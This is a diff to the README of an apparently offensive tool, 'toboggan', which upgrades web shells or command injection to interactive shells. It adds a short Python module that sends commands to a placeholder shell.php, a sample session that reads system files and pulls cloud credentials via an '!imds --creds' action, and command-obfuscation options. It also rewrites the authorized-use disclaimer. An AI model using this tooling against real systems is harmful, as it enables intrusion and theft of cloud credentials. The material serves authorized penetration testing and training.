@@ -168,9 +168,47 @@ toboggan --exec-wrapper '<command_template>'
 toboggan --request <burp_file>
 ```
 
-Upgrade your web shell or command injection to an interactive shell:
+### Quick Start
+
+**1. Write an RCE module**
+
+A Python script with an `execute()` function that sends a command to the target and returns its output:
+
+```python
+# exploit.py
+import httpx
+
+def execute(command: str, timeout: float) -> str:
+    r = httpx.post("http://target.com/shell.php", data={"cmd": command}, timeout=timeout)
+    return r.text.strip()
+```
+
+**2. Launch toboggan** with that module:
+
 ```shell
-toboggan ~/phpexploit.py
+toboggan ~/exploit.py
+```
+
+**3. Use the interactive session**
+
+Run commands, invoke actions, and exit:
+
+```shell
+www-data@target:/var/www/html $ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@target:/var/www/html $ cat /etc/hostname
+web-prod-01
+
+www-data@target:/var/www/html $ !imds --creds
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "...",
+  "Expiration": "2026-11-17T18:30:00Z"
+}
+
+www-data@target:/var/www/html $ !exit
 ```
 
 ### Proxy
@@ -220,7 +258,7 @@ toboggan ~/phpexploit.py --fifo
 
 The forward shell uses `mkfifo` under the hood to create a semi-interactive shell experience over named pipes, even in heavily restricted environments. This enables interactive commands that require stdin/stdout communication such as `sudo -l` and any scripts using `read` that expect real-time user input.
 
-Combine with obfuscation for maximum stealth:
+Combine with obfuscation and the forward shell:
 ```shell
 toboggan ~/phpexploit.py --obfuscate --fifo --os "linux"
 ```
@@ -316,19 +354,15 @@ toboggan ~/exploit.py        # Then type !<action> -h for action-specific help
 | `!obfuscate` | Toggle command obfuscation on/off |
 | `!b64` | Toggle base64 wrapping of commands before `execute()` |
 
-## Disclaimer
+## Authorized Use
 
-Toboggan is intended for use in legal penetration testing, Capture The Flag (CTF) competitions, or other authorized and ethical security assessments.
+Toboggan is built for authorized penetration testing, security research, and education. Use it only where you have documented consent from the system owner or operate within an environment you control.
 
-Acceptable environments include:
-- Private lab environments you control (local VMs, isolated networks)
-- Sanctioned learning platforms (CTFs, Hack The Box, OffSec exam scenarios)
-- Formal penetration-test or red-team engagements with documented customer consent
+Acceptable contexts:
 
-Misuse of this project may result in legal action.
+- **Authorized penetration testing** and **red team engagements** conducted under a signed statement of work or rules of engagement
+- **CTF competitions** and sanctioned learning platforms (Hack The Box, OffSec labs, TryHackMe)
+- **Security research** in private lab environments you own (local VMs, isolated networks)
+- **Educational use** in classroom or training settings with instructor-provided targets
 
-## Legal Notice
-
-Any unauthorized use of this tool in real-world environments or against systems without explicit permission from the system owner is strictly prohibited and may violate legal and ethical standards. The creators and contributors of this tool are not responsible for any misuse or damage caused.
-
-Use responsibly and ethically. Always respect the law and obtain proper authorization.
+Running this tool against systems without explicit authorization is prohibited and may violate applicable law. The authors and contributors accept no liability for unauthorized or unlawful use.
